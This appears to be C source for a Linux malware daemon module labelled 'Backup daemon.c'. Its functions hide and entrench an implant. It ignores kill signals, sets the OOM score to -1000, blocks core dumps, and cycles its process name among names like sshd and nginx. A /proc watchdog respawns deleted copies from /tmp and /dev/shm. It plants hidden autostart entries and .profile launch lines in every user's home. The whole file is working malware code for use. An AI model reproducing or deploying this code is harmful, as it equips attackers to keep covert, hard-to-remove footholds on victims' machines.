#define _GNU_SOURCE

#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/resource.h>  
#include <sys/prctl.h>    
#include <fcntl.h>        
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <dirent.h>
#include <time.h>
#include <ctype.h>
#include <errno.h>
#include <limits.h>
#include "headers/daemon.h"
// Backup daemon.c #4*
// New replace in 600s after debug
static const char* get_random_name(void) {
    static const char *names[] = {
        "update", "cache", "cron", "logs",
        "backup", "sync", "monitor", "db",
        "net", "service", "daemon", "worker"
    };
    static const size_t names_count = sizeof(names) / sizeof(names[0]);
    return names[rand() % names_count];
}

static int safe_strncpy(char *dest, const char *src, size_t size) {
    if (!dest || !src || size == 0) return -1;
    size_t len = strlen(src);
    if (len >= size) return -1;
    memcpy(dest, src, len);
    dest[len] = '\0';
    return 0;
}

static int join_path(char *dest, size_t dest_size, const char *dir, const char *file) {
    if (!dest || !dir || !file || dest_size == 0) return -1;
    size_t dir_len = strlen(dir);
    size_t file_len = strlen(file);
    size_t req_len = dir_len + file_len + 2; // +1 for '/' and +1 for '\0'
    if (req_len > dest_size) return -1;
    //fix buffer overflow 1
    memcpy(dest, dir, dir_len);
    dest[dir_len] = '/';
    //overflow 2
    //snprintf->memcpy
    memcpy(dest + dir_len + 1, file, file_len);
    dest[req_len - 1] = '\0';
    return 0;
}

static const char *process_names[] = {
    "cache", "sshd", "bash", "crond",
    "nginx", "postgres", "apache", "mysql",
    "python", "node", "redis", "memcached"
};
static const size_t process_names_count = sizeof(process_names) / sizeof(process_names[0]);

static void protect_process() {
    struct rlimit limit;
    
    limit.rlim_cur = 0;
    limit.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &limit);
    
    limit.rlim_cur = RLIM_INFINITY;
    limit.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_NOFILE, &limit);
    setrlimit(RLIMIT_NPROC, &limit);
    
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    prctl(PR_SET_DUMPABLE, 0);
    
    int fd = open("/proc/self/oom_score_adj", O_WRONLY);
    if (fd >= 0) {
        ssize_t bytes_written = 0;
        size_t total_written = 0;
        const char *oom_str = "-1000";
        size_t to_write = 5;
        
        while (total_written < to_write) {
            bytes_written = write(fd, oom_str + total_written, to_write - total_written);
            if (bytes_written <= 0) {
                if (errno == EINTR) continue;
                break;
            }
            total_written += bytes_written;
        }
        close(fd);
    }
    
    errno = 0;
    if (setpriority(PRIO_PROCESS, 0, -20) != 0 && errno != 0) {
    }
    
    signal(SIGTERM, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);
    signal(SIGALRM, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
}

void* rename_process(void* arg) {
    static unsigned int last_name_index = 0;
    while (1) {
        unsigned int name_index = (rand() % process_names_count);
        if (name_index == last_name_index) {
            name_index = (name_index + 1) % process_names_count;
        }
        const char* new_name = process_names[name_index];
        char* env_ptr = (char*)getenv("_");
        if (env_ptr) {
            size_t env_size = strlen(env_ptr);
            safe_strncpy(env_ptr, new_name, env_size + 1);
            prctl(PR_SET_NAME, new_name);
        }
        last_name_index = name_index;
        sleep(8);
    }
    return NULL;
}

int copy_file(const char *src, const char *dst) {
    char buf[1024];
    size_t size;

    FILE* source = fopen(src, "rb");
    if (!source) {
        return -1;
    }

    FILE* dest = fopen(dst, "wb");
    if (!dest) {
        fclose(source);
        return -1;
    }

    while ((size = fread(buf, 1, 1024, source)) > 0) {
        fwrite(buf, 1, size, dest);
    }

    fclose(source);
    fclose(dest);

    return chmod(dst, S_IRWXU | S_IRWXG | S_IRWXO);
}

void run_clone(const char *path, int argc, char** argv) {
    pid_t pid = fork();
    if (pid == 0) {
        overwrite_argv(argc, argv);
        execl(path, path, (char *)NULL);
        exit(EXIT_SUCCESS);
    }
}

void overwrite_argv(int argc, char** argv) {
    for (int i = 0; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }
    strncpy(argv[0], "init", strlen("init")); // uhm? i dont know about this
}

void* watchdog(void* arg) {
    static int last_spawn_time = 0;
    static int consecutive_fails = 0;
    static int last_found_copies = 0;
    
    while (1) {
        DIR* proc = opendir("/proc");
        if (!proc) {
            sleep(3);
            continue;
        }

        struct dirent* ent;
        int found_copies = 0;
        static char self_path[PATH_MAX] = {0};
        ssize_t self_len = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
        if (self_len < 0) {
            closedir(proc);
            sleep(3);
            continue;
        }
        self_path[self_len] = '\0';

        pid_t current_pid = getpid();
        time_t current_time = time(NULL);

        while ((ent = readdir(proc)) != NULL) {
            if (!isdigit((unsigned char)ent->d_name[0])) continue;
            pid_t pid = atoi(ent->d_name);
            if (pid == current_pid) continue;
            
            char exe_path[PATH_MAX] = {0};
            char cmd_path[PATH_MAX] = {0};
            char path[PATH_MAX] = {0};
            
            if (join_path(path, sizeof(path), "/proc", ent->d_name) != 0) continue;
            
            if (join_path(cmd_path, sizeof(cmd_path), path, "cmdline") == 0) {
                FILE *fcmd = fopen(cmd_path, "r");
                if (fcmd) {
                    char cmdline[PATH_MAX] = {0};
                    if (fgets(cmdline, sizeof(cmdline), fcmd) && strstr(cmdline, self_path)) {
                        found_copies++;
                    }
                    fclose(fcmd);
                }
            }
            
            if (join_path(path, sizeof(path), path, "exe") != 0) continue;
            ssize_t len = readlink(path, exe_path, sizeof(exe_path)-1);
            if (len > 0) {
                exe_path[len] = '\0';
                if (strcmp(exe_path, self_path) == 0) {
                    found_copies++;
                }
            }
        }
        closedir(proc);

        if (found_copies < last_found_copies) {
            consecutive_fails = 0;
        }

        if (found_copies < 3) {
            char source_path[PATH_MAX] = {0};
            ssize_t path_len = readlink("/proc/self/exe", source_path, sizeof(source_path)-1);
            if (path_len > 0) {
                source_path[path_len] = '\0';
                const char* dirs[] = {
                    "/dev/shm/", "/tmp/", "/var/tmp/", 
                    "/run/", "/var/run/", "/var/cache/"
                };
                
                int spawn_success = 0;
                for (int i = 0; i < sizeof(dirs)/sizeof(dirs[0]); i++) {
                    char new_path[PATH_MAX] = {0};
                    unsigned int rand_val = (unsigned int)rand() ^ (unsigned int)time(NULL) ^ (unsigned int)getpid();
                    snprintf(new_path, sizeof(new_path), "%s%x", dirs[i], rand_val);
                    
                    if (copy_file(source_path, new_path) == 0) {
                        chmod(new_path, S_IRWXU);
                        pid_t pid = fork();
                        if (pid == 0) {
                            setsid();
                            if (daemon(0, 0) == 0) {
                                protect_process();
                                errno = 0;
                                if (nice(-20) == -1 && errno != 0) {
                                }
                                execl(new_path, new_path, NULL);
                            }
                            exit(0);
                        } else if (pid > 0) {
                            spawn_success = 1;
                            consecutive_fails = 0;
                        }
                        unlink(new_path);
                        if (spawn_success) break;
                    }
                }
                
                if (!spawn_success) {
                    consecutive_fails++;
                }
            }
        }

        last_found_copies = found_copies;
        sleep(found_copies < 3 ? 3 : 8);
    }
    return NULL;
}

int ensure_startup_persistence(const char *source_path) {
    if (!source_path) return -1;

    static const char *home_dirs[] = {
        "/home",
        "/root",
        "/var/home",
        "/var/lib",
        "/var/run"
    };
    
    static const char *startup_locations[] = {
        "/.config/autostart",
        "/.local/bin",
        "/.cache",
        "/tmp"
    };
    
    static const int home_dirs_count = sizeof(home_dirs) / sizeof(home_dirs[0]);
    static const int startup_locations_count = sizeof(startup_locations) / sizeof(startup_locations[0]);
    
    char temp_path[PATH_MAX] = {0};
    static const char *autostart_str = "autostart";

    for (int i = 0; i < home_dirs_count; i++) {
        DIR *dir = opendir(home_dirs[i]);
        if (!dir) continue;
        
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type != DT_DIR || entry->d_name[0] == '.') continue;
            
            for (int j = 0; j < startup_locations_count; j++) {
                char dest_dir[PATH_MAX] = {0};
                unsigned int rand_val = (unsigned int)rand() ^ (unsigned int)time(NULL) ^ (unsigned int)getpid();
                
                if (join_path(temp_path, sizeof(temp_path), home_dirs[i], entry->d_name) != 0) continue;
                if (join_path(dest_dir, sizeof(dest_dir), temp_path, startup_locations[j] + 1) != 0) continue;
                
                if (mkdir(dest_dir, 0755) != 0 && errno != EEXIST) continue;
                
                char dest_path[PATH_MAX] = {0};
                const char* name = get_random_name();
                size_t remaining = sizeof(dest_path);
                size_t written = snprintf(dest_path, remaining, "%s/%s_%x", dest_dir, name, rand_val);
                if (written >= remaining) continue;
                
                if (access(dest_path, F_OK) == 0) continue;
                
                if (copy_file(source_path, dest_path) == 0) {
                    if (strstr(dest_dir, autostart_str)) {
                        char desktop_path[PATH_MAX] = {0};
                        if (join_path(desktop_path, sizeof(desktop_path), dest_dir, "updater.desktop") == 0) {
                            FILE *f = fopen(desktop_path, "w");
                            if (f) {
                                fprintf(f, "[Desktop Entry]\nType=Application\nName=%s\nExec=%s\nHidden=true\nX-GNOME-Autostart-enabled=true\n", 
                                    name, dest_path);
                                fclose(f);
                                chmod(desktop_path, 0644);
                            }
                        }
                    }
                    
                    chmod(dest_path, S_IRUSR | S_IWUSR | S_IXUSR);
                    
                    char profile_path[PATH_MAX] = {0};
                    if (join_path(temp_path, sizeof(temp_path), home_dirs[i], entry->d_name) == 0 &&
                        join_path(profile_path, sizeof(profile_path), temp_path, ".profile") == 0) {
                        
                        int entry_exists = 0;
                        FILE *check = fopen(profile_path, "r");
                        if (check) {
                            char line[PATH_MAX];
                            while (fgets(line, sizeof(line), check)) {
                                if (strcmp(line, dest_path) == 0) {
                                    entry_exists = 1;
                                    break;
                                }
                            }
                            fclose(check);
                        }

                        if (!entry_exists) {
                            FILE *profile = fopen(profile_path, "a");
                            if (profile) {
                                fprintf(profile, "\n(nohup %s >/dev/null 2>&1 &)\n", dest_path);
                                fclose(profile);
                            }
                        }
                    }
                }
            }
        }
        closedir(dir);
    }
    return 0;
}

void signal_handler(int sig) {
    if (sig == SIGTERM || sig == SIGINT) {
        signal(sig, signal_handler);
        return;
    }
}

void setup_signal_handlers() {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = SIG_IGN;
    sigaction(SIGPIPE, &sa, NULL);
    sigaction(SIGHUP, &sa, NULL);
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);
    signal(SIGALRM, SIG_IGN);
    signal(SIGUSR1, SIG_IGN);
    signal(SIGUSR2, SIG_IGN);
}

void daemonize(int argc, char** argv) {
    srand(time(NULL) ^ getpid());
    protect_process();
    
    char source_path[PATH_MAX] = {0};
    ssize_t len = readlink("/proc/self/exe", source_path, sizeof(source_path)-1);
    if (len > 0) {
        source_path[len] = '\0';
        ensure_startup_persistence(source_path);
    }

    pid_t pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    setup_signal_handlers();
    if (setsid() < 0) {
        exit(EXIT_FAILURE);
    }
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    umask(0);
    if ((chdir("/")) < 0) {
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < sysconf(_SC_OPEN_MAX); i++) {
        close(i);
    }

    const char* dirs[] = {
        "/var/tmp/",
        "/tmp/",
        "/dev/shm/",
        "/run/",
        "/var/run/",
        "/var/cache/",
        "/var/log/",
        "/var/lib/"
    };
    
    int copies_created = 0;
    unsigned int seed = time(NULL) ^ getpid();

    for (int i = 0; copies_created < 3 && i < sizeof(dirs) / sizeof(dirs[0]); i++) {
        char dest_path[PATH_MAX] = {0};
        const char* name = get_random_name();
        unsigned int rand_val = (unsigned int)rand() ^ (unsigned int)time(NULL) ^ (unsigned int)getpid();
        
        snprintf(dest_path, sizeof(dest_path), "%s%s-%x", dirs[i], name, rand_val);
        
        if (access(dest_path, F_OK) == 0) continue;
        
        if (copy_file(source_path, dest_path) == 0) {
            pid_t clone_pid = fork();
            if (clone_pid == 0) {
                srand(seed ^ getpid());
                if (daemon(0, 0) == 0) {
                    execl(dest_path, name, NULL);
                }
                exit(0);
            }
            copies_created++;
            seed = rand();
            unlink(dest_path);
        }
    }

    pthread_t rename_thread;
    pthread_create(&rename_thread, NULL, rename_process, NULL);
    
    pthread_t watchdog_thread;
    pthread_create(&watchdog_thread, NULL, watchdog, NULL);
    
    pthread_detach(rename_thread);
    pthread_detach(watchdog_thread);
}
